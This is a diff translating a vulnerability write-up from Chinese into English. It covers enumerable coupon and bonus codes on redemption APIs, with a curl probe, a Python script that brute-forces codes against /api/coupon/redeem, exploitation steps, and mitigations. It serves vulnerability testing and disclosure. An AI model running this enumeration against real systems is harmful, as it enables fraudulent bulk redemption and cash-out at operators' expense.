@@ -1,36 +1,36 @@
 ﻿---
-title: 券码 / 彩金码可枚举（批量领取与套现）
-cve: 无（业务逻辑）
+title: Enumerable coupon / bonus codes (bulk redemption and cash-out)
+cve: None (business logic)
 severity: high
 cvss: 8.3
-product: 自研活动/兑换码系统
-versions: 任意
+product: Custom promotion/redemption-code system
+versions: Any
 ports: 80, 443
-keywords: 券码, 彩金, 兑换, 枚举, coupon, 领取
+keywords: coupon codes, bonuses, redemption, enumeration, coupon, claiming
 entry: /api/coupon/redeem  /api/promo/exchange
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 POST /api/coupon/redeem {"code":"ABCD1234"}
 GET  /api/promo/list
 ```
 
-## 前置条件
+## Prerequisites
 
-- 普通会员；码长度短或有序（6-8 位字母数字）。
+- A regular member; short or sequential codes (6-8 alphanumeric characters).
 
 ## PoC
 
 ```bash
-# 1) 先试自己的码，确认响应差异（成功/已用/不存在）
+# 1) Try your own code first and confirm response differences (success/already used/nonexistent)
 curl -s -X POST https://target/api/coupon/redeem -H "Authorization: Bearer <t>" \
   -H 'Content-Type: application/json' -d '{"code":"AAAA0001"}'
 
-# 2) 小字典枚举（限速，先 200 个证明可行性）
+# 2) Enumerate a small dictionary (rate-limit; start with 200 to demonstrate feasibility)
 python3 - <<'PY'
 import requests, random, string
 t="https://target"; tk="<token>"
@@ -42,21 +42,21 @@ for _ in range(200):
     if r.status_code==200 and '"code":0' in r.text: ok.append((code, r.text[:80]))
 print(len(ok), ok[:3])
 PY
-# 判定：出现成功领取 = 命中（并发会更快）
+# Result: successful redemption = confirmed (concurrency would be faster)
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先看码规则（长度/字符集/是否连续）；
-2. 200 次小样本证明可枚举，别大规模刷；
-3. 命中后换算金额，写清"可批量套现"的危害；
-4. 证据：成功码 + 领取响应 + 余额变化。
+1. Inspect code rules first (length/character set/whether sequential);
+2. Demonstrate enumeration with a small sample of 200 attempts; do not farm at scale;
+3. After success, calculate the monetary value and clearly explain the risk of "bulk cash-out";
+4. Evidence: a successful code + redemption response + balance change.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 码长 ≥12 随机 + 一次性 + 绑定活动与用户；领取失败计数与限速；
-- 兑换接口加行为风控（同 IP/设备高频拒绝）。
+- Random codes of length ≥12 + single use + bound to promotion and user; count failed claims and rate-limit;
+- Add behavioral risk controls to redemption endpoints (reject high-frequency requests from the same IP/device).
 
-## 参考
+## References
 
 - OWASP WSTG-BUSL-04；CWE-799。
